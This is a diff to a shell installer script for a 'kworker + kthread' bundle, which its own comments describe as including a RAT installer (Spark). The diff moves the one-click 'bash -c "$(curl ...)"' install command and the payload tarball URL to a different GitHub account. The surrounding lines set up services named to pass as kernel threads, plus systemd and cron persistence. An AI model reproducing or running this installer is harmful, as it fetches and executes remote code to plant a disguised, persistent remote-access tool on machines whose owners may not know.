@@ -4,9 +4,9 @@
 # kworker + kthread combined one-click installer (install_all.sh)
 # Combines install.sh (kworker) and install_rat.sh (Spark kthread).
 # Usage:
-#   bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_all.sh)"
+#   bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/install_all.sh)"
 # Package:
-#   https://raw.githubusercontent.com/wondream322/kworker/master/kworker.tar.gz
+#   https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kworker.tar.gz
 # ============================================
 
 set -uo pipefail
@@ -25,7 +25,7 @@ KTHREAD_START="${KTHREAD_DIR}/start-kthread.sh"
 KWORKER_START="${KWORKER_DIR}/start-kworker.sh"
 KTHREAD_SERVICE="kthread"
 WATCH_SERVICE="kthread-watch"
-DOWNLOAD_URL="${DOWNLOAD_URL:-https://raw.githubusercontent.com/wondream322/kworker/master/kworker.tar.gz}"
+DOWNLOAD_URL="${DOWNLOAD_URL:-https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kworker.tar.gz}"
 
 USE_SYSTEMD=1
 USE_CRON_D=1
